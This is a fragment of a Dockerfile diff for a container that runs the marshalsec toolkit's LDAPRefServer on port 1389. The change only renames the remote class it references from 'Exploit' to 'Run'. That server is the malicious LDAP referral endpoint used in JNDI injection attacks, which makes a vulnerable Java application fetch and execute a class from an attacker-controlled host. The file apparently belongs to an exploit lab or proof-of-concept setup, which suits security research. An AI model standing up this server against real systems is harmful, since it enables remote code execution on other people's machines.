@@ -12,4 +12,4 @@ COPY --from=builder /usr/src/app/target/marshalsec-0.0.3-SNAPSHOT-all.jar /usr/a
 
 EXPOSE 1389
 
-ENTRYPOINT ["java", "-cp", "/usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://127.0.0.1:8888/#Exploit"]
+ENTRYPOINT ["java", "-cp", "/usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://127.0.0.1:8888/#Run"]
